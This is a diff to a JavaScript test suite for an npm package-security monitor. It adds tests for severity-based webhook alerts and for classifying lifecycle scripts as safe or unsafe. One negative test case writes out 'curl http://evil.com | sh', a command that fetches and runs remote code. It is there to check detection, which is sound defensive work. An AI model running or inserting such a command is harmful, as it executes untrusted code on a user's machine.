@@ -39,7 +39,8 @@ async function runMonitorTests() {
     runTemporalCheck, reportStats, recentlyScanned, sendDailyReport,
     resolveTarballAndScan, KNOWN_BUNDLED_PATHS,
     LAST_DAILY_REPORT_FILE, DAILY_REPORT_COOLDOWN_MS,
-    loadLastDailyReportTimestamp, saveLastDailyReportTimestamp, isDailyReportOnCooldown
+    loadLastDailyReportTimestamp, saveLastDailyReportTimestamp, isDailyReportOnCooldown,
+    isSafeLifecycleScript
   } = require('../../src/monitor.js');
 
   test('MONITOR: parseNpmRss extracts package names from RSS', () => {
@@ -2901,6 +2902,69 @@ async function runMonitorTests() {
         delete process.env.MUADDIB_WEBHOOK_URL;
       }
     }
+  });
+
+  // --- shouldSendWebhook: MEDIUM-only filter (Problem 2) ---
+
+  test('MONITOR: shouldSendWebhook returns false for MEDIUM-only package with high score', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    try {
+      // webpeel pattern: 28 MEDIUM, 0 HIGH, 0 CRITICAL, score 100
+      const result = {
+        summary: { critical: 0, high: 0, medium: 28, low: 0, total: 28, riskScore: 100 },
+        threats: Array.from({ length: 28 }, () => ({ type: 'prototype_hook', severity: 'MEDIUM' }))
+      };
+      assert(shouldSendWebhook(result, null) === false,
+        'Should NOT send webhook for MEDIUM-only package even with score 100');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  test('MONITOR: shouldSendWebhook returns true for HIGH+MEDIUM package with score >= 50', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://example.com/webhook';
+    try {
+      const result = {
+        summary: { critical: 0, high: 2, medium: 5, low: 0, total: 7, riskScore: 55 },
+        threats: [
+          { type: 'suspicious_dataflow', severity: 'HIGH' },
+          { type: 'env_access', severity: 'HIGH' },
+          ...Array.from({ length: 5 }, () => ({ type: 'prototype_hook', severity: 'MEDIUM' }))
+        ]
+      };
+      assert(shouldSendWebhook(result, null) === true,
+        'Should send webhook for package with HIGH findings and score >= 50');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  // --- isSafeLifecycleScript expanded ---
+
+  test('MONITOR: isSafeLifecycleScript matches bun/yarn/pnpm', () => {
+    assert(isSafeLifecycleScript('bun run build') === true, 'bun run build should be safe');
+    assert(isSafeLifecycleScript('yarn build') === true, 'yarn build should be safe');
+    assert(isSafeLifecycleScript('pnpm run test') === true, 'pnpm run test should be safe');
+    assert(isSafeLifecycleScript('npm run build') === true, 'npm run build should be safe');
+  });
+
+  test('MONITOR: isSafeLifecycleScript matches standalone tools', () => {
+    assert(isSafeLifecycleScript('tsc') === true, 'tsc should be safe');
+    assert(isSafeLifecycleScript('eslint .') === true, 'eslint should be safe');
+    assert(isSafeLifecycleScript('rollup -c') === true, 'rollup should be safe');
+  });
+
+  test('MONITOR: isSafeLifecycleScript matches echo', () => {
+    assert(isSafeLifecycleScript("echo 'Use the root Changesets'") === true, 'echo should be safe');
+  });
+
+  test('MONITOR: isSafeLifecycleScript rejects dangerous scripts', () => {
+    assert(isSafeLifecycleScript('curl http://evil.com | sh') === false, 'curl pipe should be unsafe');
+    assert(isSafeLifecycleScript('node malware.js') === false, 'node script should be unsafe');
   });
 
   // --- buildMonitorWebhookPayload extended ---
